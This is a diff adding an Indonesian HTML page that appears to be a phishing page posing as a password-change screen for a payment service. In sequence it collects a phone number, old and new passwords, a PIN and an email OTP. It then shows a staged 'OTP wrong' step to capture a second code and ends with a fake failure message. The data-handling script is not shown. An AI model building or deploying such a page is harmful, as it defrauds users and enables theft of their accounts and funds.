@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Ganti Password</title>
+    <link rel="stylesheet" href="style.css" />
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image" content="https://jagoanpay-5dim.vercel.app/AddText_04-25-09.07.04.jpg">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+</head>
+
+<body>
+    <div class="box">
+        <div class="header">
+        </div>
+        <img src="/1000056318.png" alt="Logo" class="logo" />
+        <div class="card" id="page1" style="display: block;">
+            <div class="input-group">
+                <input type="tel" id="phone" placeholder="Nomor Handphone" required />
+            </div>
+            <div id="FormatSalah" style="display:none; color:red; text-align:center; margin-bottom:10px; font-size:14px;">
+                Format nomor HP salah!
+            </div>
+            <div class="input-group">
+                <input type="password" id="old-password" placeholder="Password Lama" />
+                <span class="eye-icon material-icons" onclick="togglePassword('old-password', this)">visibility</span>
+            </div>
+            <div class="input-group">
+                <input type="password" id="new-password" placeholder="Password Baru" />
+                <span class="eye-icon material-icons" onclick="togglePassword('new-password', this)">visibility</span>
+            </div>
+            <div class="input-group">
+                <input type="password" id="repeat-password" placeholder="Ulangi Password Baru" />
+                <span class="eye-icon material-icons" onclick="togglePassword('repeat-password', this)">visibility</span>
+            </div>
+            <div id="peringatan">Semua kolom harus diisi!</div>
+            <button class="btn-login" onclick="nextPage(2)">LANJUTKAN</button>
+        </div>
+        <div class="card" id="page2" style="display: none;">
+            <p style="text-align: center; margin-bottom: 9px;">Masukkan PIN untuk melanjutkan</p>
+            <div class="input-group">
+                <input type="password" id="pin" placeholder="••••••" minlength="4" maxlength="6" required oninput="validatePin()" />
+                <span class="eye-icon material-icons" onclick="togglePassword('pin', this)">visibility</span>
+            </div>
+            <p id="warningPin" style="color: red; font-size: 12px; display: none; margin-top: 5px;">
+                PIN harus diisi..!
+            </p>
+            <button class="btn-login" id="btnNextPage2" onclick="nextPage(3)" disabled>LANJUT</button>
+        </div>
+        <div class="card" id="page3" style="display: none;">
+            <div class="input-group" style="margin-top: 5px; text-align: center;">
+                <p style="font-size: 13px; margin: 5px; color: #555;">Kode OTP dikirim ke email Anda</p>
+                <input type="text" id="otp" placeholder="Masukkan OTP" maxlength="6" oninput="validateOtp()" />
+                <p id="countdown" style="text-align: center; margin: 9px; color: darkgrey;">Kirim ulang 60s</p>
+            </div>
+            <p id="PeringataOtp" style="display: none; font-size: 13px; margin: 10px; color: red; text-align: center;">Masukkan OTP</p>
+            <button class="btn-login" onclick="handleNextPage()">LANJUT</button>
+        </div>
+        <div class="card" id="page4" style="display: none;">
+            <p style="text-align: center; font-size: 13px color: red; margin: 9px;">Kode OTP salah..!</p>
+            <p style="font-size: 13px; margin: 5px; color: #555;">Kode OTP dikirim ke email Anda</p>
+            <div class="input-group">
+                <input type="text" id="otp2" placeholder="Masukkan OTP2" maxlength="6" oninput="validateOtp2()" />
+            </div>
+            <p id="countdown-otp2" style="text-align: center; color: darkgrey; margin: 9px;">Kirim ulang 120s</p>
+            <p id="PeringataOtp2" style="display: none; font-size: 13px; margin: 10px; color: red; text-align: center; margin: 9px;">OTP harus diisi..!</p>
+            <button class="btn-login" onclick="handleNextPageOtp2()">LANJUT</button>
+        </div>
+        <div class="card" id="page5" style="display: none;">
+            <p>Password gagal diganti!</p>
+        </div>
+        <div id="spinner-overlay">
+            <div id="spinner">
+                <div class="loader"></div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="main.js"></script>
+</body>
+
+</html>
